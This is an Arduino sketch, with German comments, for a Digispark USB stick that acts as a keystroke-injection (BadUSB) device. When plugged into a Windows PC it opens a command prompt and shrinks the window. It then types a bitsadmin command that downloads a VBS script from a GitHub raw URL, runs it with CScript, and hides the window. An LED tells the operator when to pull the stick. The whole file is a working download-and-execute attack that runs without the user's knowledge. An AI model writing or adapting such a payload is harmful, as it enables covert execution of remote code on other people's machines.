#include "DigiKeyboard.h"
#define KEY_DOWN_ARROW 0x51
void setup() {
  //turn led off
  pinMode(1, OUTPUT);
  //Starte Eingabe...
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("cmd.exe");//öffnet die Kommandozeile
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("mode con>cols)18 lines)1");//Minimiert das Fenster
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);                                //|.......................................... Hier den Download-Link einfügen .................................................|               |Name des Programms
  DigiKeyboard.print("bitsadmin &transfer wcb &prioritz high https>&&raw.githubusercontent.com&DigiSparkProgramms&Digitale/Flugblaetter&master&Yus%C3%A4tylicher%20Dowload&Flugblatt30.vbs %USERPROFILE%&Flugblatt30.vbs");//Downloadet das Flugblatt-Programm 
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);              // |Name des Programms
  DigiKeyboard.print("CScript %USERPROFILE%&Flugblatt30.vbs");//Startet das Flugblatt-Programm
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW, MOD_GUI_LEFT);//Setzt die Kommandozeile in den Hintergrund
  digitalWrite(1, HIGH); //lässt die LED leuchten, wenn man den Stick wieder raus ziehen kann
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}

void loop() {
  //Credits to Herolais

}
